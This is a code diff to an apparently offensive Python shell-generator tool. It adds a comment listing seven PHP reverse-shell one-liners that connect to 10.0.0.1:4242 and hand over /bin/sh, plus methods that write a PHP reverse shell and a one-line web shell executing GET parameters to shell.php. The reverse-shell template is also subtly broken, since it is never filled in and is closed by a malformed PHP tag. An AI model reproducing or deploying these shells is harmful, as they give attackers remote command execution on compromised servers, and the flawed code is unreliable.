@@ -19,6 +19,9 @@ class Shell:
     def generate_bind_shell(self):
         logger.error("bind shell not implemented")
 
+    def generate_cmd_shell(self):
+        logger.error("cmd shell not implemented")
+
 
 class C(Shell):
     def __init__(self, address: str, port: int, shell: str):
@@ -49,3 +52,28 @@ class Php(Shell):
     def __init__(self, address: str, port: int, shell: str):
         Shell.__init__(self, address=address, port=port)
         self.shell = shell
+
+        '''
+            Variants:
+            
+            php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+            php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+            php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+            php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+            php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
+            php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+            php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+        '''
+
+    def generate_reverse_shell(self):
+        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");>"
+        with open('shell.php', 'w') as file:
+            file.write(shell)
+
+        logger.info("created shell.php")
+
+    def generate_cmd_shell(self):
+        shell = "<?php system($_GET['cmd']);?>"
+        with open('shell.php', 'w') as file:
+            file.write(shell)
+        logger.info("created shell.php")
